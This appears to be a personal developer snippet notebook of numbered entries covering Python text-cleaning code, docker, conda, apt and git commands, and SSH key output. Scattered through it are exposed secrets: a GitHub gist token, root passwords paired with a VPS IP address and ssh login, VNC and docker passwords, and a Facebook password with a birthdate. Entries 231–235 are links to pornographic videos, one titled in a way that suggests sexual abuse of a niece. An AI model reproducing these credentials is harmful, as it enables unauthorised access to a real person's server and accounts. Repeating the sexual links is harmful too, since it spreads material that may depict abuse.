    except ValueError:
        print('Value error!!!!!')
----
id:203

from __future__ import division
from PIL import Image
def REsize(img, base):
    im = Image.open(img)
    w, h = im.size
    x = base/w
    y = int(h * x)
    # many processes require even numbers
    # resizes to the next highest even number
    if y %2 != 0:
        y = y+1
    imout = im.resize((base, y))
    return imout
resize images resize by base keep aspect

----
id:204

strcleaned = ''.join([x for x in strtoclean if ord(x) < 128])
----------
clean code unicode clean ascii 8 byte unicode error can not decode over 128 decose encode problems
code error encode error can not decode

----
id:205

bad_words = ['.ipynb_checkpoints', 'checkpoint', '/.ipynb']
with open('ipynb.list') as oldfile, open('ipynb-clean.list', 'w') as newfile:
    for line in oldfile:
        if not any(bad_word in line for bad_word in bad_words):
            newfile.write(line)
bad words, remove bad words

----
id:206

(py27) jack@jack-desktop:~/Desktop/JupyterNotebook-ijs$ ijsinstall
(py27) jack@jack-desktop:~/Desktop/JupyterNotebook-ijs$ ijs
javascript notebook ijs 
----
id:207

(py35) jack@jack-desktop:~/Desktop/JupyterNotebook-ijs/samples/notebooks$ docker ps
ab67ecbb4fae        nikhilk/ijs     'start.sh' port 9999
docker run -i -p 9999:9999 -v /home/jack/Desktop/JupyterNotebook-ijs/samples/notebooks:/data -t nikhilk/ijs
(py27) jack@jack-desktop:~/Desktop/JupyterNotebook-ijs$ docker restart ab67ecbb4fae
ab67ecbb4fae
(py27) jack@jack-desktop:~/Desktop/JupyterNotebook-ijs$ docker stop ab67ecbb4fae
ab67ecbb4fae

----
id:208

(py35) jack@jack-desktop:~/Downloads/deepforge-master$ docker-compose up
deep forge  deepforge developement environment 
----
id:209
docker copy
docker cp /home/jack/Desktop/JupyterNotebook-ijs/samples/notebooks/HelloWorld-NodeJS153043859661.ipynb ab67ecbb4fae:/data
docker copy cp data to docker 
----
id:210

post to gist token:
 f28dcab1c756fb99e35ff3a2a9cd249cb2aae5bd 

----
id:211

https://www.dataquest.io/blog/jupyter-notebook-tips-tricks-shortcuts/ 
jupyter notebook tips links link 
----
id:212

https://jonghyunkim816.wordpress.com  pd gem Gem 
Pd 
----
id:214

https://github.com/scijava/scijava-jupyter-kernel
# Add the conda-forge channel
conda config --add channels conda-forge
# Create an isolated environment called  and install the kernel
conda create --name java_env scijava-jupyter-kernel
Usage :
# Activate the  environment
source activate java_env
# Check the kernel has been installed
jupyter kernelspec list
# Launch your favorite Jupyter client
jupyter notebook
----
id:216

#!/bin/bash
# NB: First install nscd with sudo apt-get install nscd
# run this command to flush dns cache:
sudo /etc/init.d/dns-clean restart
# or use:
sudo /etc/init.d/networking force-reload
# Flush nscd dns cache:
sudo /etc/init.d/nscd restart
# If you wanted to refresh your settings you could disable and then run
sudo service network-manager restart
echo 'DNS Flushed!';

----
id:217

caffe install caffe 
conda create --prefix ~/caffe caffe

----
id:218

conda create --name java_env scijava-jupyter-kernel
conda activate java_env install java8 
----
id:219

/home/jack/anaconda2/envs/py27/include/google/protobuf/ google protobuff 
google.protobuf

----
id:221

echo '# javascript' >> README.md
git init
git add README.md
git commit -m 'first commit'
git remote add origin https://github.com/BlogBlocks/javascript.git
git push -u origin master
enter user and password
----
id:222

# NOTE: Use of ' not in '
text = 'This is a test that will remove words if found exists in lines of text by using a set .'
# create an empty set
LZ = set()
# words to add to the empty set
lines = 'test to find CRap exists is a that'
# split the lines into words then add to the set LZ
for line in lines.split(' '):
    LZ.add(line)
# Create a lambda filter using the set created 
# The filter will remove the words in lines from the text
result = filter(lambda x: x not in LZ, text.split(' '))
# join the results and print
print (' '.join(result))
----
id:223

text = '''
filter(function or None, iterable) --> filter object |
Return an iterator yielding those items of iterable for which function(item) |
is true. If function is None, return the items that are true. |
Methods defined here: |
__getattribute__(self, name, /) |
Return getattr(self, name). |
__iter__(self, /) |
Implement iter(self). |
'''
# whitelist removes all none alpha characters and allows spaces.
whitelist = set('abcdefghijklmnopqrstuvwxy ABCDEFGHIJKLMNOPQRSTUVWXYZ')
text = text.split('|')
for line in text:
    line = line.replace('
', '')
    line = ''.join(filter(whitelist.__contains__, line)) 
    print line

----
id:224

# %%writefile badwords.txt
shit
piss
fuck
ass
------------------------
with open('badwords.txt', 'r') as f:
    badwords = set(word.strip() for word in f)
    print badwords
    
text = 'The chat read, That stupid fuck can piss should in the wind.'
wordz = ' '.join(filter(lambda x: x not in badwords, text.split(' ')))
print wordz    
----
id:225

# Removing words from lines
# NOTE: In the sentence line = words needed a space behind it so 
#       line.split(' ') would work .
line = 'This is a test that will find out if CRap exists in lines of words .'
text = ('is test a CRap find in words This')
wordz = ' '.join(filter(lambda x: x in text, line.split(' ')))
print wordz
----
id:226

clean text
import io
import string
import enchant
d = enchant.Dict('en_US')
filein = 'www.gutenberg.lib/text/ALLfiles.txt'
fileout = 'ngram-from Allfiles.txt'
whitelist = set('abcdefghijklmnopqrstuvwxy ABCDEFGHIJKLMNOPQRSTUVWXYZ')
IN = open(filein,'r').readlines()
OUT = open(fileout,'a')
count = 0
for line in IN:
    #line = line.encode('ascii', 'ignore')
    printable = set(string.printable)
    line = filter(lambda x: x in printable, line)
    line = ''.join(filter(whitelist.__contains__, line)) 
    line = line.replace('u'','')
    line = line.replace('_',' ')
    line = line.replace('\'',' ')
    line = line.replace('-',' ')
    line = line.replace(':',' ')
    line = line.replace(')','')
    line = line.replace('(','')
    line = line.replace('.','')
    line = line.replace(';',' ')
    line = line.replace('/',' ')
    line = line.replace('   ',' ')
    line = line.replace('  ',' ')
    line = line.replace('  ',' ')
    newline = line.lower()
    newline = newline.replace('
', '')
    if len(newline)>100:
            newline = newline.split(' ')
            for word in newline:
                count = count +1
                #if count<100:print word
                #if count > 16 and count < 160 and len(word)>1:
                if len(word)>0:    
                    if d.check(word) == True:
                        #if count > 2000:sys.exit()
                        OUT.write(word+', ')
                        count = count +1
                        #print (count)
                        #if count %25 == 0:OUT.write('
')
OUT.close()

----
id:227

wordz = []
chat = 'this is a #happy #crazy chat that uses the at signs @jacknorthrup @joe_shott that must be removed.'
chat = chat.replace('. ',' .')
words = chat.split(' ')
for word in words:
    if word[:1] is not '@' and word[:1] is not '#' :
        wordz.append(word)
print ' '.join(wordz)        
remove words with specific characters
----
id:230

from random import randint
srt = 0
SRT = []
nums = set()
numZ = set()
for Y in range(50):
    srt = srt + 1
    ST = str(srt)
    SRT.append(ST)
    print (ST, end=' ')
print('
')
Srt = ((str(SRT)))    
count = 0
for x in range(15):
    RND = randint(1,50)
    RNd = str(RND)
    numZ.add(RND)
    nums.add(RNd)
#for n in nums:
#    count = count +1
#    print (n, end =' ',)
stri = sorted(numZ)
for S in (stri):
    count = count +1
    print(S, end=' ')
print('
'+str(count),'random numbers chosen from 50.')
srt = Srt.replace('[\'','')
srt = srt.replace('\']','')
result = filter(lambda x: x not in nums, srt.split('\', \''))
# join the results and print
NU = (' '.join(result))
print('----------------------------')
print(NU)
print('These numbers were not chosen.')
X = NU.split(' ')
print(len(X),'numbers left after random are subtracted.')
----
id:231

https://www.xnxx.com/video-kdov1db/my_sister

----
id:232

https://www.xnxx.com/video-gu8cvba/tio_usa_como_juguete_a_su_sobrina
----
id:233

https://www.xnxx.com/video-6pwuc16/first_time_sex_for_a_beauty
----
id:234

https://www.xnxx.com/video-ebk9r29/downloadfile

----
id:235

https://www.xnxx.com/video-fwpgd15/blacked_petite_blonde_with_the_biggest_bbc_in_the_world
----
id:236

pipreqs /home/project/location
Successfully saved requirements file in /home/project/location/requirements.txt
Contents of requirements.txt
::
    wheel==0.23.0
    Yarg==0.1.9
    docopt==0.6.2
generate requirements.txt

----
id:237

You can delete the lock file with the following command:
sudo rm /var/lib/apt/lists/lock
You may also need to delete the lock file in the cache directory
sudo rm /var/cache/apt/archives/lock
sudo rm /var/lib/dpkg/lock
sudo rm /var/cache/apt/archives/lock
sudo rm /var/lib/dpkg/lock

----
id:238

google-chrome-stable
sudo nano /etc/apt/sources.list.d/google-chrome.list
deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main
wget https://dl.google.com/linux/linux_signing_key.pub
sudo apt-key add linux_signing_key.pub
sudo apt-get update
sudo apt install google-chrome-unstable
To start Chrome browser from the command line, run:

google-chrome-stable
----
id:239

NAME   FSTYPE   UUID
loop0  squashfs 
loop1  squashfs 
loop2  squashfs 
loop3  squashfs 
loop4  squashfs 
loop5  squashfs 
loop6  squashfs 
sda             
├─sda1 vfat     7209-9FEC
├─sda2 ext4     40ec525c-34bc-44ef-99c8-53f5524ad88b
├─sda3 swap     ffc47937-76ca-4ec7-b7cc-0041e4710517
└─sda4 ext4     f7143108-78cd-4f76-9b24-6313c0cb4c45
sdb    vfat     9580-BDE5
sr0             

----
id:240

updatedb -l 0 -o ~/.Orig.db -U /media/jack/40ec525c-34bc-44ef-99c8-53f5524ad88b
The following command will query the database:
locate -d ~/.externalharddisk.db searchterm
You can also query the dedicated database and the default database at the same time:
locate -d ~/.externalharddisk.db: searchterm
The colon at the end followed by nothing means to also search in the default database.
You can make an alias for easier use. Put the following line in your .bashrc:
alias locate-external='locate -d ~/.externalharddisk.db:'
Now you can use locate to search only the default database and locate-e

----
id:241

lua modules installed at /home/jack/.luarocks 

----
id:242

node version v8.10.0
npm 3.5.2 
nodejs node js node version
----
id:243

find packages https://packages.debian.org
linus package search
----
id:244

luasocket 3.0rc1-2 is now installed in /home/jack/luarocks-3.0.3/lua_modules
from /usr/include/stdio.h:862:0,
                 from /usr/include/lua5.1/lauxlib.h:13,
                 from src/options.c:7:
/usr/include/x86_64-linux-gnu/bits/stdio2.h:33:10:
(base) jack@jack-desktop:~/luarocks-3.0.3$ ./configure; sudo make bootstrap

Configuring LuaRocks version 3.0.3...

Lua version detected: 5.1
Lua interpreter found: /usr/bin/lua5.1
lua.h found: /usr/include/lua5.1/lua.h
unzip found in PATH: /usr/bin

Done configuring.

LuaRocks will be installed at......: /usr/local
LuaRocks will install rocks at.....: /usr/local
LuaRocks configuration directory...: /usr/local/etc/luarocks
Using Lua from.....................: /usr


----
id:245

https://evcu.github.io/notes/condaEnv/
source activate <new_env_name>
conda install nb_conda
source deactivate
conda create -n <new_env_name> python
source activate <new_env_name>
conda install pytorch torchvision -c soumith
source deactivate
(base) jack@jack-desktop:~$ conda activate TVis
(TVis) jack@jack-desktop:~$ conda install pytorch torchvision -c soumith

----
id:246

/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied ldconfig

----
id:247

One way would be to

conda list --export > exported-packages.txt

And then edit that file to remove the last part of each package with the py27_0 parts (you might also want to remove the versions, in case some version of a package doesn't have a Python 3 version). Then

conda create -n py3clone --file exported-packages.txt

Another idea would be to clone the environment:

conda create -n clonedenv --clone oldenv
conda install -n clonedenv python=3.4
conda update -n clonedenv --all
----
id:248

sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' cc4439ff29f4
find ip docker 
----
id:249

password 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8
sh1 sh password
----
id:250
docker build -t takacsmark/alpine-smarter:1.0 .
----
id:251

https://linuxmeerkat.wordpress.com/2014/10/17/running-a-gui-application-in-a-docker-container/
 gui in docker docker gui 
----
id:252

# Use Ububtu 14.04 as our base O/S
FROM ubuntu:14.04

# Set our working directory
WORKDIR /

# Update the repositories and then install java
RUN apt-get update && install -y default-jre

# Copy the application from its folder to our image
# Assumes docker build is run from /myapp/src
ADD /build/distributions/myapp.jar /myapp.jar

# Run the app when the container is executed.
CMD ['java', '-jar myapp.jar']
----
id:253

docker run -d -p 8888:8888 -e PASSWORD=ThinkPadT0 jacknorthrup-data/science:latest
----
id:254

docker run -d -p 80:8888 -e PASSWORD=MakeAPassword -e USE_HTTP=1 ipython/notebook
----
id:256

docker run -it -p 5900:5900 -e VNC_PASSWORD=ThinkPadT0 jacknorthrup.torchjupzbavnc:ver2
----
id:257

docker run -i -t -p 5900:5900 -e VNC_PASSWORD=ThinkPadT0 welkineins/ubuntu-xfce-vnc-desktop
----
id:258

docker inspect 779fa9604906 | grep "IPAddress" 
----
id:259

sudo cp /etc/fstab /etc/fstab.2018-10-03
sudo service docker stop  
sudo mkdir /usr/local/docker  
sudo rsync -aXS /var/lib/docker/. /usr/local/docker/  
/usr/local/docker /var/lib/docker none bind 0 0

----
id:260

sudo nano /etc/gdm3/custom.conf 
----
id:261

/home/jack/key.pem
SHA256:Snbmwp16sXC+a1DQIvGcTBxNIcE7dmcYlRRODyb2Le0 jahral@yahoo.com
The key's randomart image is:
+---[RSA 4096]----+
|    .+=*=+Bo     |
|    .==++*.=     |
|     .=+ o+ +    |
|      + + oo     |
|     .o+So  E    |
|     +o*o.       |
|      +=+o       |
|       o=        |
|      .ooo       |
+----[SHA256]-----+

----
id:262

view web page in terminal
page="<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<title>Jack Northrup - </title>
<meta name="description" content="Links to programming resources, Jupyter Notebook examples, Python scripts and VPS info">
<meta name="keywords" content="HTML, CSS, XML, JavaScript">
<meta name="author" content="Jack Northrup">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="index-styles.css"> 
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-117499764-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-117499764-1');
</script>

</head>
<body>
<div id="wrapper">
<h1>The New Jack Northrup</h1>
<h2>Created with Jupyter Notebook</h2>
<p>Soon to be loaded with website examples, images, code tutorials, and snippets.</p>
<hr>
	<div class="space"><h4>What I Do With My Free Time</h4>

		<div class="sect">
			<ul>
                        <li><a href="https://jacknorthrup.com/snippets" target="_blank">Python Snippet Images created with Python</a></li>
                        <li><a href="https://jacknorthrup.com/postoids" target="_blank">A Few Postoids I Have Made</a></li>
			<li><a href="https://jacknorthrup.com/news" target="_blank">Links to News Resources</a></li>
			<li><a href="https://jacknorthrup.com/jupyter-notebooks/" target="_blank">Jupyter Notebook Examples</a></li>
                        <li><a href="https://jacknorthrup.com/generate-youtube-video-webpages-with-python" target="_blank">My YouTube Videos</a></li> 
			<li><a href="https://jacknorthrup.com/computer-graphics-image-slideshow.html" target="_blank">SLIDE SHOW</a></li>
			<li><a href="https://www.jacknorthrup.com/bible" target="_blank">My Search-able King James Bible</a></li>
			<li><a href="https://jacknorthrup.com/ionicfish/ionicfish/www/" target="_blank">Fish Kiss My First Android App Game</a></li>
                        <li><a href="https://jacknorthrup.com/FISHkiss.zip" target="_blank">DOWNLOAD FISHkiss</a></li>
			<li><a href="https://jacknorthrup.com/all-snippets.txt" target="_blank">Long List of Python Snippets</a></li>
			<li><a href="https://www.jacknorthrup.com/ProductionVideo" target="_blank">Video Stuff</a></li>
			<li><a href="https://www.jacknorthrup.com/PythonPit/" target="_blank">PythonPit</a></li>
			<li><a href="https://www.jacknorthrup.com/my-vps-adventures/" target="_blank">my-vps-adventures</a></li>
			<li><a href="https://www.jacknorthrup.com/makeonline/" target="_blank">A Toy in Progress</a></li>
			<li><a href="https://www.jacknorthrup.com/pencil/" target="_blank">A Pencil Created with CSS</a></li>
			<li><a href="https://jacknorthrup.com/special/" target="_blank">More Playing with CSS</a></li>
			<li><a href="https://jacknorthrup.com/star-medallion/" target="_blank">Playing with CSS</a></li>
			<li><a href="https://jacknorthrup.com/new-jack/" target="_blank">Some Old Stuff</a></li>
			<li><a href="https://jacknorthrup.com/Web-Design-Portfolio" target="_blank">Some VERY Old Stuff</a></li>
			<li><a href="https://jacknorthrup.com/conventional/" target="_blank">Old Experiments</a></li>
			<li><a href="http://nuitka.net/doc/user-manual.html" target="_blank">Nuitka Manual</a></li>
			</ul>
		</div>
	</div>
</div>

</body></html>"
echo "<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<title>Jack Northrup - </title>
<meta name="description" content="Links to programming resources, Jupyter Notebook examples, Python scripts and VPS info">
<meta name="keywords" content="HTML, CSS, XML, JavaScript">
<meta name="author" content="Jack Northrup">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="index-styles.css"> 
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-117499764-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-117499764-1');
</script>

</head>
<body>
<div id="wrapper">
<h1>The New Jack Northrup</h1>
<h2>Created with Jupyter Notebook</h2>
<p>Soon to be loaded with website examples, images, code tutorials, and snippets.</p>
<hr>
	<div class="space"><h4>What I Do With My Free Time</h4>

		<div class="sect">
			<ul>
                        <li><a href="https://jacknorthrup.com/snippets" target="_blank">Python Snippet Images created with Python</a></li>
                        <li><a href="https://jacknorthrup.com/postoids" target="_blank">A Few Postoids I Have Made</a></li>
			<li><a href="https://jacknorthrup.com/news" target="_blank">Links to News Resources</a></li>
			<li><a href="https://jacknorthrup.com/jupyter-notebooks/" target="_blank">Jupyter Notebook Examples</a></li>
                        <li><a href="https://jacknorthrup.com/generate-youtube-video-webpages-with-python" target="_blank">My YouTube Videos</a></li> 
			<li><a href="https://jacknorthrup.com/computer-graphics-image-slideshow.html" target="_blank">SLIDE SHOW</a></li>
			<li><a href="https://www.jacknorthrup.com/bible" target="_blank">My Search-able King James Bible</a></li>
			<li><a href="https://jacknorthrup.com/ionicfish/ionicfish/www/" target="_blank">Fish Kiss My First Android App Game</a></li>
                        <li><a href="https://jacknorthrup.com/FISHkiss.zip" target="_blank">DOWNLOAD FISHkiss</a></li>
			<li><a href="https://jacknorthrup.com/all-snippets.txt" target="_blank">Long List of Python Snippets</a></li>
			<li><a href="https://www.jacknorthrup.com/ProductionVideo" target="_blank">Video Stuff</a></li>
			<li><a href="https://www.jacknorthrup.com/PythonPit/" target="_blank">PythonPit</a></li>
			<li><a href="https://www.jacknorthrup.com/my-vps-adventures/" target="_blank">my-vps-adventures</a></li>
			<li><a href="https://www.jacknorthrup.com/makeonline/" target="_blank">A Toy in Progress</a></li>
			<li><a href="https://www.jacknorthrup.com/pencil/" target="_blank">A Pencil Created with CSS</a></li>
			<li><a href="https://jacknorthrup.com/special/" target="_blank">More Playing with CSS</a></li>
			<li><a href="https://jacknorthrup.com/star-medallion/" target="_blank">Playing with CSS</a></li>
			<li><a href="https://jacknorthrup.com/new-jack/" target="_blank">Some Old Stuff</a></li>
			<li><a href="https://jacknorthrup.com/Web-Design-Portfolio" target="_blank">Some VERY Old Stuff</a></li>
			<li><a href="https://jacknorthrup.com/conventional/" target="_blank">Old Experiments</a></li>
			<li><a href="http://nuitka.net/doc/user-manual.html" target="_blank">Nuitka Manual</a></li>
			</ul>
		</div>
	</div>
</div>

</body></html>"

----
id:263

just created 'GETip' to get docker ip
just run GETip followed by container number 
----
id:264

scp -rp sourcedirectory user@dest:/path
copy a directory to a VPS,cp directory,copy vps
scp filename or * user@dest:/path
----
id:265



    -I : Sets the path to the include files.
    -L : Sets the path to the libraries.
    -l : Use this library (eg. -lm to use libmath.so, -lpthread to use libpthread.so)

    You can have multiple -I, -L and -l entries.
    So, your final command should look like this:

    g++ program.cpp -o executable -I /path/to/includes -L /path/to/libraries -l library1 -l library2 

export LIBRARY_PATH=:/usr/local/include
c++ libraries, set library path, set-library-path
----
id:266

empty trash, trash, 
rm -rf ~/.local/share/Trash/*

----
id:267

display small video on screen
mplayer tv:// -tv driver=v4l2:width=200:height=150 -vo xv -geometry 90%:90% -noborder
webcam on screen.

----
id:268

conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/
conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/
conda config --set show_channel_urls yes

----
id:269
 
#!/bin/bash
#docker pull fgrehm/eclipse:v4.4.1
docker run -ti --rm -e DISPLAY=:0.0 -v /tmp/.X11-unix:/tmp/.X11-unix -v /home/jack/Desktop/eclipse-docker:/home/developer -v /home/jack/Desktop:/workspace fgrehm/eclipse:v4.4.1

----
id:271
 
notify-send 'Hello world!' 'This is an example notification.' --icon=dialog-information
desktop notification 
https://specifications.freedesktop.org/icon-naming-spec/icon-naming-spec-latest.html
ubunut built in icons

----
id:272

x5bw4tKXM7Xv304ZrY
ssh root@162.208.10.253
NED -i 
----
id:273

(base) jack@jack-desktop:~/Desktop$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/jack/.ssh/id_rsa): /home/jack/.ssh/centosdocker
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/jack/centosdocker.
Your public key has been saved in /home/jack/centosdocker.pub.
The key fingerprint is:
SHA256:T5GApYx8wQoQDV2HTp34BcF377roaYGjQkhWFSBQjng jack@jack-desktop
The key's randomart image is:
+---[RSA 2048]----+
|*O.o+O**o        |
|.o=o++*oo...     |
|o E+oo+o .o.     |
| +  o..    ..    |
|o.     .S ..     |
|. .   o .o  .    |
| .   . . ...     |
|  . .   .o.      |
|   .   o+ ..     |
+----[SHA256]-----+
passphrase - centosdocker

----
id:274

Enter file in which to save the key (/home/jack/.ssh/id_rsa): centos    
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in centos.
Your public key has been saved in centos.pub.
The key fingerprint is:
SHA256:ym4zeyiQJu29/hIsE7HttEHkdss5zqgj54JGEIHDXaA jack@jack-desktop
The key's randomart image is:
+---[RSA 2048]----+
|+..o+.           |
|+.oo.            |
| E =o .          |
|. o.+o o         |
|.. * o= S        |
|..B == o         |
|o+ =..=.         |
|+.+.+.= .        |
|.=ooo*+=         |
+----[SHA256]-----+

----
id:275

new centos password asF41LWmf489pEzR9J

----
id:276

Password has been changed. New password: CB8Pu7vF9Ypb99qLz5
CB8Pu7vF9Ypb99qLz5
162.208.10.253
jupyternotebook.science
root@162.208.10.253
ssh-copy-id -i ~/.ssh/centos root@162.208.10.253

ThinkPadT0
ThinkPadT2524collage 

----
id:277

docker run -d   -e MYSQL_ROOT_PASSWORD=my-secret-pw   -v /home/docker/mysql-data:/var/lib/mysql   --name mysqlserver   mysql

----
id:280

Myra facebook facebook 
May 15 1984
ThinkPadT$#43

----
id:281

deb mirror://mirrors.ubuntu.com/mirrors.txt precise main restricted universe multiverse
deb mirror://mirrors.ubuntu.com/mirrors.txt precise-updates main restricted universe multiverse
deb mirror://mirrors.ubuntu.com/mirrors.txt precise-backports main restricted universe multiverse
deb mirror://mirrors.ubuntu.com/mirrors.txt precise-security main restricted universe multiverse

on the top in your /etc/apt/sources.list file should be all that is needed to make it automatically pick a mirror for you based on your geographical location.repository, local, local repository, mirror 

----
id:282
rsync -av --progress jack@162.208.10.253:/home/jack/rpmpackages.txt ~/Desktop/BracketsDocker

----
id:283

docker without sudo 
sudo groupadd docker
sudo gpasswd -a jack docker
make a goup and then make yourself a member
must re-login in for it to go 
into effect

----
id:285

https://www.twilio.com/docs/usage/tutorials/how-to-set-up-your-python-and-flask-development-environment
twilio twilo flask app 

----
id:286
 
what permissions, ssh, view permission,
numerical permissions, octal permissions,
ssh permissions, directory permission,
directory permissions
-----------------------------------------
Typically you want the permissions to be:
.ssh directory: 700 (drwx------)
public key (.pub file): 644 (-rw-r--r--)
private key (id_rsa): 600 (-rw-------)
home directory should not be writeable by 
the group or others (at most 755 (drwxr-xr-x)).
-----------------------------------------
view permission numbers
stat -c '%a' /home/jack/.ssh/id_rsa
----
id:287

don't forget this place code help
code info tutorials 
https://www.w3resource.com/
----
id:288

find a file apt find apt-file
apt get find ' apt-file find filename '

----
id:290
 
https://repl.it/languages
multi language coding online
https://glot.io/
----
id:291
 
ffmpeg -y  -f alsa -ac 2 -i hw:1,0 -strict -2 -f x11grab -framerate 30 -video_size 640x640 -i :0.0+360,100 -c:v libx264 -pix_fmt yuv420p -qp 0 -preset ultrafast VideoLast.mp4

----
id:292

create custom cursors
https://www.cursor.cc
'

----
id:293

Installation on Ubuntu 18.04:

sudo add-apt-repository ppa:morphis/anbox-support
sudo apt install -y anbox-modules-dkms
sudo modprobe ashmem_linux
sudo modprobe binder_linux
sudo snap install --devmode --beta anbox

----
id:294

sudo luarocks install lsqlite3
Installing https://rocks.moonscript.org/lsqlite3-0.9.3-0.src.rock...
Using https://rocks.moonscript.org/lsqlite3-0.9.3-0.src.rock... switching to 'build' mode
Error: Could not find expected file sqlite3.h, or sqlite3.h for SQLITE --
MUST INSTALL: sudo apt install libsqlite3-dev

----
id:296

https://www.learnopencv.com/install-opencv3-on-ubuntu/
git clone https://github.com/opencv/opencv_contrib.git
cd opencv_contrib
git checkout 3.3.1
cd ..
git clone https://github.com/opencv/opencv.git
cd opencv 
git checkout 3.3.1 
cd ..
cd opencv
mkdir build
cd build
cmake -D CMAKE_BUILD_TYPE=RELEASE       -D CMAKE_INSTALL_PREFIX=/usr/local       -D INSTALL_C_EXAMPLES=ON       -D INSTALL_PYTHON_EXAMPLES=ON       -D WITH_TBB=ON       -D WITH_V4L=ON       -D WITH_QT=ON       -D WITH_OPENGL=ON       -D OPENCV_EXTRA_MODULES_PATH=../../opencv_contrib/modules       -D BUILD_EXAMPLES=ON ..
make -j2
sudo make install
sudo sh -c 'echo "/usr/local/lib" >> /etc/ld.so.conf.d/opencv.conf'
sudo ldconfig
----
id:297

get sdl sdl2 SDL2 version
dpkg -l | grep sdl
ii  libsdl-image1.2:amd64                        1.2.12-8                                      amd64        Image loading library for Simple DirectMedia Layer 1.2, libraries
ii  libsdl-kitchensink-dev:amd64                 0.0.7-3                                       amd64        FFmpeg and SDL2 based library for audio and video playback - Development files
ii  libsdl-kitchensink0:amd64                    0.0.7-3                                       amd64        FFmpeg and SDL2 based library for audio and video playback
ii  libsdl1.2debian:amd64                        1.2.15+dfsg2-0.1                              amd64        Simple DirectMedia Layer
ii  libsdl2-2.0-0:amd64                          2.0.8+dfsg1-1ubuntu1.18.04.1                  amd64        Simple DirectMedia Layer
ii  libsdl2-dev:amd64                            2.0.8+dfsg1-1ubuntu1.18.04.1                  amd64        Simple DirectMedia Layer development files
ii  libsdl2-gfx-1.0-0:amd64                      1.0.4+dfsg-1                                  amd64        drawing and graphical effects extension for SDL2
ii  libsdl2-gfx-dev:amd64                        1.0.4+dfsg-1                                  amd64        development files for SDL2_gfx
ii  libsdl2-image-2.0-0:amd64                    2.0.3+dfsg1-1                                 amd64        Image loading library for Simple DirectMedia Layer 2, libraries
ii  libsdl2-image-dev:amd64                      2.0.3+dfsg1-1                                 amd64        Image loading library for Simple DirectMedia Layer 2, development files
ii  libsdl2-mixer-2.0-0:amd64                    2.0.2+dfsg1-2                                 amd64        Mixer library for Simple DirectMedia Layer 2, libraries
ii  libsdl2-ttf-2.0-0:amd64                      2.0.14+dfsg1-2                                amd64        TrueType Font library for Simple DirectMedia Layer 2, libraries
ii  python-pygame-sdl2                           6.99.14.1-1                                   amd64        reimplementation of the Pygame API using SDL2
ii  python-sdl2                                  0.9.3+dfsg2-1  
----
id:298

dpkg -l | grep sdl
ii  libsdl-image1.2:amd64 1.2.12-8  amd64 
Image loading library for Simple DirectMedia Layer 1.2, libraries

ii  libsdl-kitchensink-dev:amd64 0.0.7-3 amd64
FFmpeg and SDL2 based library for audio and video playback - Development files

ii  libsdl-kitchensink0:amd64 0.0.7-3 amd64
FFmpeg and SDL2 based library for audio and video playback

ii  libsdl-ttf2.0-0:amd64 2.0.11-4 amd64
TrueType Font library for Simple DirectMedia Layer 1.2, libraries

ii  libsdl-ttf2.0-dev:amd64 2.0.11-4 amd64
TrueType Font library for Simple DirectMedia Layer 1.2, development files

ii  libsdl1.2-dev 1.2.15+dfsg2-0.1 amd64
Simple DirectMedia Layer development files

ii  libsdl1.2debian:amd64 1.2.15+dfsg2-0.1 amd64
Simple DirectMedia Layer

ii  libsdl2-2.0-0:amd64 2.0.8+dfsg1-1ubuntu1.18.04.1 amd64
Simple DirectMedia Layer

ii  libsdl2-dev:amd64 2.0.8+dfsg1-1ubuntu1.18.04.1 amd64
Simple DirectMedia Layer development files

ii  libsdl2-gfx-1.0-0:amd64 1.0.4+dfsg-1 amd64
drawing and graphical effects extension for SDL2

ii  libsdl2-gfx-dev:amd64  1.0.4+dfsg-1  amd64
development files for SDL2_gfx

ii  libsdl2-image-2.0-0:amd64 2.0.3+dfsg1-1 amd64
Image loading library for Simple DirectMedia Layer 2, libraries

ii  libsdl2-image-dev:amd64   2.0.3+dfsg1-1  amd64
Image loading library for Simple DirectMedia Layer 2, development files

ii  libsdl2-mixer-2.0-0:amd64 2.0.2+dfsg1-2 amd64
Mixer library for Simple DirectMedia Layer 2, libraries

ii  libsdl2-ttf-2.0-0:amd64 2.0.14+dfsg1-2 amd64
TrueType Font library for Simple DirectMedia Layer 2, libraries

ii  libsdl2-ttf-dev:amd64  2.0.14+dfsg1-2 amd64
TrueType Font library for Simple DirectMedia Layer 2, development files

ii  python-pygame-sdl2  6.99.14.1-1 amd64
reimplementation of the Pygame API using SDL2

ii  python-sdl2 0.9.3+dfsg2-1 all
Python bindings to the SDL2 C-library (Py
SDL2 SDL version sdl2 version 

----
id:299

sdl2 sdl path paths 
/usr/lib/x86_64-linux-gnu/libSDL2main.a;/usr/lib/x86_64-linux-gnu/libSDL2_image.so;/usr/lib/x86_64-linux-gnu/libSDL2_ttf.so;/usr/lib/x86_64-linux-gnu/libSDL2main.a;/usr/lib/x86_64-linux-gnu/libSDL2.so;-lpthread
/usr/include/SDL2;/usr/local/include/SDL2

----
id:300

Ubuntu mirrors
http://ubuntu.unc.edu.ar/ubuntu/
http://mirrors.asnet.am/ubuntu/
http://mirror.aarnet.edu.au/pub/ubuntu/archive/
